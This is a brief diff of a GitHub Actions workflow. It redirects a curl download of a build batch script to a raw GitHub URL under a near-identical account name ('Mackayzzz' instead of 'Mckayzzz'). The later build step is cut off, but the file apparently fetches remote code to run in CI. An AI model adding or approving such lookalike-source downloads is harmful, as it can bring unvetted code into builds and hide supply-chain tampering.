@@ -12,7 +12,7 @@ jobs:
       
     - name: script
       shell: cmd
-      run: curl -o build.bat https://raw.githubusercontent.com/Mckayzzz/wiliwili-uwp-poc/main/build-ci.bat
+      run: curl -o build.bat https://raw.githubusercontent.com/Mackayzzz/wiliwili-uwp-poc/refs/heads/main/build-ci.bat
 
     - name: build
       shell: cmd
